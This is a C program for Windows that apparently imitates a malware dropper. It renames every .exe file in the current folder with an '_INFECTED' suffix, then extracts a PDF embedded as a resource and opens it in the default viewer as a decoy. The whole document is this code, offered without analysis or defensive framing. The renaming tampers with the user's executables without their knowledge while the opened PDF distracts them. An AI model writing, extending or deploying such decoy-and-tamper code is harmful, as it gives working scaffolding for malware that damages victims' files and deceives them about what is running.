#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <windows.h>

void renameExeFiles(const char *directoryPath) {
    char searchPath[MAX_PATH];
    sprintf(searchPath, "%s\\*.exe", directoryPath);

    WIN32_FIND_DATA findFileData;
    HANDLE hFind = FindFirstFile(searchPath, &findFileData);

    if (hFind == INVALID_HANDLE_VALUE) {        
        return;
    }

    do {
        char oldPath[MAX_PATH];
        char newPath[MAX_PATH];
        sprintf(oldPath, "%s\\%s", directoryPath, findFileData.cFileName);
        sprintf(newPath, "%s\\%s_INFECTED.exe", directoryPath, findFileData.cFileName);        
        MoveFile(oldPath, newPath);
    } while (FindNextFile(hFind, &findFileData) != 0);

    FindClose(hFind);
}

void openEmbeddedPdf() {
    // Assuming the PDF is embedded as a resource in the executable
    HRSRC hResource = FindResource(NULL, MAKEINTRESOURCE(101), RT_RCDATA);

    if (hResource == NULL) {        
        return;
    }

    HGLOBAL hGlobal = LoadResource(NULL, hResource);
    if (hGlobal == NULL) {        
        return;
    }

    LPVOID pData = LockResource(hGlobal);
    DWORD dwSize = SizeofResource(NULL, hResource);

    FILE *pdfFile = fopen("embedded_pdf.pdf", "wb");
    if (pdfFile == NULL) {
        printf("No se pudo crear el archivo PDF.\n");
        return;
    }

    fwrite(pData, 1, dwSize, pdfFile);
    fclose(pdfFile);

    // Open the PDF using the default PDF viewer
    system("start embedded_pdf.pdf");

    // Clean up
    UnlockResource(hGlobal);
}

int main() {
    // Rename .exe file adding the suffix "_INFECTED"
    renameExeFiles(".");

    // Open the embbeded PDF file
    openEmbeddedPdf();

    return 0;
}
